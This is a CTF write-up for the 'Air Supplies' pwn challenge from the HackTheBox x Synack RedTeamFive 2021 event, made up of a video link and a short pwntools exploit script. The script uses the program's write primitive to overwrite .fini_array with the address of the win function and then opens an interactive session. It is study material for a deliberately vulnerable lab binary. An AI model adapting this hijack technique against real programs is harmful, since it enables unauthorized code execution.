---
name: Air Supplies (2021)
event: HackTheBox x Synack RedTeamFive CTF 2021
category: Pwn
description: Writeup for Air Supplies (pwn) - HackTheBox x Synack RedTeamFive CTF (2021) 💜
layout:
    title:
        visible: true
    description:
        visible: true
    tableOfContents:
        visible: true
    outline:
        visible: true
    pagination:
        visible: true
---

# Air Supplies

## Video Walkthrough

[![VIDEO](https://img.youtube.com/vi/Kqu3qpYMml8/0.jpg)](https://youtu.be/Kqu3qpYMml8?t=2276s "HackTheBox x Synack RedTeamFive 2021: Air Supplies")

## Solution

{% code overflow="wrap" %}
```py
from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './air_supplies'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Start program
io = start()

io.sendlineafter('>', '2')  # Yes, I'm ready
io.sendlineafter('Insert what kind of supply to drop:', str(elf.symbols.__init_array_end))  # Write over .fini_array
io.sendlineafter('Insert location to drop:', str(elf.symbols._))  # With the win function

io.interactive()
```
{% endcode %}
